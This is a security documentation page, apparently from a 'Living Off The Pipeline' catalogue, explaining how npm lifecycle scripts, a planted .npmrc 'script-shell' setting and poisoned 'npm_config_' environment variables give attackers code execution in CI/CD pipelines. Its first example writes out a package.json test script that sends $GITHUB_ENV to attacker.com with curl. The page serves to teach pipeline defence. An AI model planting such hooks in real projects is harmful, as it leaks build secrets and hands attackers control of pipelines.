---
layout: tool
title: npm
parent: Living Off The Pipeline
nav_order: 40
---

## Living Off The Pipeline - npm

`npm` is the default package manager for Node.js. It has multiple, powerful "Living Off The Pipeline" (LOTP) vectors that allow an attacker to achieve Remote Code Execution (RCE).

### Vector 1: `package.json` Scripts (First-Order LOTP Tool)

The most common vector for `npm` is its lifecycle scripts, defined in the `scripts` section of the `package.json` file.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** Commands like `npm install`, `npm test`, and `npm run <script>` are designed to execute user-defined shell commands from the `package.json` file. An attacker can add a malicious command to the `scripts` section. When a CI/CD pipeline runs a standard `npm` command, it will execute the attacker's payload.
*   **Example `package.json`:**
    ```json
    {
      "scripts": {
        "test": "curl --data-binary @$GITHUB_ENV http://attacker.com/ && jest"
      }
    }
    ```

### Vector 2: `.npmrc` Configuration (First-Order LOTP Tool)

A more subtle vector is the `.npmrc` file. `npm` loads configuration from a `.npmrc` file in the local repository. An attacker can use this file to change `npm`'s behavior.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** An attacker can place a malicious `.npmrc` file in their pull request. This file can set dangerous configuration options, such as `script-shell`, which defines the shell to be used for running scripts.
*   **Attack Chain:**
    1.  **Attacker's PR:** The PR contains a `.npmrc` file with `script-shell=./malicious.sh` and the `malicious.sh` script.
    2.  **Vulnerable Workflow:** The pipeline runs a standard `npm test` command.
    3.  **Execution:** `npm` reads the local `.npmrc`, uses the attacker's `malicious.sh` to run the `test` script, and achieves RCE.

### Vector 3: Environment Variable Poisoning (Execution Gadget)

`npm`'s configuration can be influenced by environment variables prefixed with `npm_config_`. This makes `npm` a powerful **Execution Gadget**.

*   **Primitive:** Remote Code Execution (RCE).
*   **Mechanism:** A "Setup Gadget" can poison an environment variable like `npm_config_script_shell`. Any subsequent `npm run` command will then use the attacker's malicious shell.
*   **Attack Chain:**
    1.  **Setup:** An early pipeline step is tricked into setting the environment variable `npm_config_script_shell=./malicious.sh`.
    2.  **Execution:** A later step runs a standard `npm test` command. `npm` reads the environment variable and uses the attacker's shell, achieving RCE.

### References

*   [npm Docs: `scripts`](https://docs.npmjs.com/cli/v10/using-npm/scripts)
*   [npm Docs: `.npmrc` file](https://docs.npmjs.com/cli/v10/configuring-npm/npmrc)
*   [npm Docs: `script-shell` config](https://docs.npmjs.com/cli/v10/using-npm/config#script-shell)